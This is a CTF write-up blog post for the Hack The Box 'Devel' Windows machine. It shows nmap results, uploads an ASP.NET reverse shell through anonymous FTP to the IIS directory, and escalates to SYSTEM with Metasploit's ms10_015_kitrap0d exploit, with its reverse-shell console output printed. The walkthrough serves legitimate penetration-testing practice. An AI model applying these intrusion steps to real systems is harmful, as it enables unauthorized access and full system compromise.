---
layout: post
title: Devel
date: 2020-03-30
author: th3-3inst3in
comments: true
categories: htb
tags: [Windows,htb]
---

## Devel writeup

Easy Windows machine

![main]({{ site.giturl }}/MyCtfWriteups/assets/images/htb/Devel/main.png)


Let's do a quick nmap all ports

```perl

Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-30 09:54 EDT
Nmap scan report for 10.10.10.5
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.97 seconds

```

<br>

### Enumeration

- Found that ftp anonymous login was allowed and using that I could upload files on to the IIS server web directory which in simpler words mean a shell.
- I used the InsomniaShell shell which can be found here `https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/`


![user shell]({{ site.giturl }}/MyCtfWriteups/assets/images/htb/Devel/ushell.png)

I upgraded the normal shell to meterpreter and used local exploit usggester to see if I can priv esec.



![local_exploit_suggester]({{ site.giturl }}/MyCtfWriteups/assets/images/htb/Devel/exploitsuggest.png)



### Exploitation

Used the ms10-015 exploit and got Nt authority

```perl

msf5 exploit(windows/local/ms10_015_kitrap0d) > exploit

[*] Started reverse TCP handler on 10.10.14.3:555 
[*] Launching notepad to host the exploit...
[+] Process 3444 launched.
[*] Reflectively injecting the exploit DLL into 3444...
[*] Injecting exploit into 3444 ...
[*] Exploit injected. Injecting payload into 3444...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (180291 bytes) to 10.10.10.5
[*] Meterpreter session 3 opened (10.10.14.3:555 -> 10.10.10.5:49159) at 2020-03-30 14:05:32 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 


```
